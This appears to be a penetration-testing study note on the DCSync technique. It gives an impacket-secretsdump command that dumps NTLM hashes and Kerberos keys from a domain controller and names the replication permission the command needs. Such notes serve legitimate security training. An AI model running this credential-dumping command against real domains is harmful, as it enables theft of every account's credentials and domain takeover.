---
tags:
  - linux
  - dcsync
---
```shell-session
$ impacket-secretsdump -outputfile inlanefreight_hashes -just-dc <DOMAIN>/<USER>@<DC-IP>
```
>The `<USER>` should have `DS-Replication-Get-Changes-All` permission assigned

# Useful Flags
- `-just-dc`: extracts NTLM hashes and Kerberos keys from the NTDS file